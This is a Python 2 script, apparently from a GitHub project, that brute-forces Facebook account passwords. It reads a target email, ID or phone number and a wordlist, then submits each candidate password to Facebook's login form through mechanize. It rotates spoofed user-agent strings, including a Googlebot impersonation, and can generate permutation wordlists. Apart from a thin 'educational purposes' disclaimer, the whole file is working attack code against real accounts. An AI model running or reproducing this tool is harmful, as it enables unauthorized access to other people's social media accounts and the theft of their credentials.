#!/usr/bin/evn python2
# encoding: utf-8

# github https://github.com/Xdwnff-04x/forcfa
# Forcfa Facebook brute force
# este script tenta descobrir a senha de uma determinada conta do facebook
# utilizando uma wordlist.
# Aviso: script para fins educacionais, não use-o para fins ilegais,
# não me responsabilizarei por nenhum ato malicioso.

__author__ = "Zwdeff <santosandradeemerson0@gmail.com>"
__version__ = "0.4"
xn = '\033[0;92m'
x1 = '\033[1;36m'
x2 = '\033[0;31m'
x3 = '\033[1;32m'
x5 = '\033[1;34m'
x6 = '\033[0;34m'
x4 = '\033[1;37m'
x7 = '\033[91m'
x8 = '\033[92m'
x9 = '\033[93m'
x10 = '\033[94m'
x11 = '\033[95m'
x12 = '\033[96m'
x13 = '\033[97m'
x = '\033[m'

import sys
if sys.version_info.major > 2:
   print ("\033[0;31m?Erro: Progama suportado somente em Python 2.7\033[m")
   sys.exit()
import cookielib
import random
import time
import pdb
try:
   import itertools
except ImportError:
   print "\033[0;31m?Erro: Por favor Instale itertools, para proseguir\033[m"
   time.sleep(3), sys.exit()
try:
   import mechanize
except ImportError:
   print "\033[0;31m?Erro: Por favor Instale mechanize, html5lib, para proseguir\033[m"
   time.sleep(3), sys.exit()

banner = x10+'''
  ______  _____  _____   ______  ______  ____    
 |   ___|/     \|     | |   ___||   ___||    \   
 |   ___||     ||     \ |   |__ |   ___||     \  v0.4
 |___|   \_____/|__|\__\|______||___|   |__|\__\  Author: Zwdeff\n'''
print (banner)
print (x10+''' Aviso: script para fins educacionais. \n'''+x)

def brut():
 email = str(raw_input(x10+"* Enter: Email, ID, ou Telefone: ::"+x10+" "))
 passl = str(raw_input(x10+"* Enter: Caminho da Wordlist: ::"+x10+" "))
 o9 ='Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3'
 o8 ='Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
 n1 ='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'
 n2 ='Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1'
 n3 ='Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0'
 n4 ='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04'
 n6 ='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
 n7 ='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.6) Gecko/2009022111 Gentoo Firefox/3.0.6'
 n8 ='Mozilla/5.0 (X11; Linux x86_64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'
 n9 ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:48.0) Gecko/20100101 Firefox/48.0'
 o1 ='Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8'
 o2 ='Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7'
 o3 ='Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3'
 o6 ='Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2'
 n5 ='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0'
 o4 ='Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3'
 b1 ='Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16'
 o5 ='Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3'
 o7 ='Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534'

 agents = [('User-agent', n1, n2, n3, n4, n5, n6, n7, n8, n9, o1, o2, o3, o4, o5, o6, o7, o8, o9, b1)]
 login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
 def brutef(password):
   try:
      sys.stdout.write("\r \033[94m%s\n ... " % password)
      sys.stdout.flush()
      br.addheaders = [('User-agent', random.choice(agents))]
      site = br.open(login)
      br.select_form(nr=0)
      br.form['email'] = email
      br.form['pass'] = password
      br.submit()
      log = br.geturl()
      if log != login:
         print (x10+"* Password Encontrado:\n ... * Password: %s" % (password))
         case()
   except IOError:
      print ("\033[0;31m Erro: Por favor connecte-se a uma Rede de Dados Estavel \033[m")
      case()
   except KeyboardInterrupt:
         print "\033[0;31m\n saindo...\033[m"
         time.sleep(3)
         sys.exit()
 def search():
     global password
     for password in passwords:
         brutef(password.replace("\n",""))
 def brute():
     global br
     global passwords
     try:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cookielib.LWPCookieJar())
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
     except IOError:
        print ("\033[0;31m Erro: Por favor connecte-se a uma Rede de Dados Estavel \033[m")
        case()
     except KeyboardInterrupt:
        print "\033[0;31m\n saindo...\033[m"
        time.sleep(3)
        sys.exit()
     try:
        list = open(passl, "r")
        passwords = list.readlines()
        count = 0
        while count < len(passwords):
              passwords[count] = passwords[count].strip()
              count += 1
     except IOError:
         print ("\033[0;31m\nErro: caminho da Wordlist invalido?")
         case()
     except KeyboardInterrupt:
         print "\033[0;31m\n saindo...\033[m"
         time.sleep(3)
         sys.exit()
     try:
         print (x10+"\n[–] Conta: %s" % (email))
         print x10+"[–] WordL:", len(passwords), "Passwords\033[m\n\n"
         time.sleep(2)
         print x10+"* Testando:", len(passwords), "senhas\n"
         search()
         brutef(password)
     except KeyboardInterrupt:
         print "\033[0;31m\n saindo...\033[m"
         time.sleep(3)
         sys.exit()
 if __name__ == '__main__':
    brute()
def case():
 try:
    print (x10+'''
 1 - Generate wordlist
 2 - Import wordlist
 0 - exit
\n'''+x)
    arn = raw_input(x10+" ~+ ::"+x10+" ")
    while arn != "1" or arn != "2" or arn != "0":
       if arn == "1" or arn == "2" or arn == "0":
          if arn == "2":
             print (x10+"* Esse script suporta:")
             print (x10+"  ID de usuario\n"+"  Email\n"+"  Numero de Telefone\n")
             brut()
             case()
          elif arn == "1":
             def ret():
                 n = int(raw_input(x10+'* Enter: Numero, de quantas Combinacoes: ::'+x10+" "))
                 if n <= 10:
                    data = []
                    lists = []
                    for i in range(0, n):
                        m = raw_input(x10+'+ Enter: \033[0;94mElemento para matris: ::'+x10+" ")
                        data.append(m)
                    chars = "".join(data)
                    for i in range(1, len(chars) + 1):
                        for p in itertools.permutations(data, len(data)):
      	                    lists.append("".join(p))
                    passl = open(raw_input(x10+"\n* Enter: Nome para o arquivo: :: "+x10+" ")+".txt",'w')
                    for item in lists:
                        passl.write(str(item) + "\n")
                    if passl != 0:
                       passl.close()
                       print x10+"  * Passwords salvos no arquivo ", passl.name +"\033[m"
                       time.sleep(3)
                       case()

                 else:
                  print ("\033[0;31m  Erro: utilize um numero dentre 1 e 10\033[m")
                  ret()
             ret()
          elif arn == "0":
             print "\033[0;31m saindo...\033[m"
             time.sleep(3)
             sys.exit()

       else:
        arn = raw_input(x10+" ~+ ::"+x10+" ")
 except KeyboardInterrupt:
    print "\033[0;31m\n saindo...\033[m"
    time.sleep(3)
    sys.exit()
case()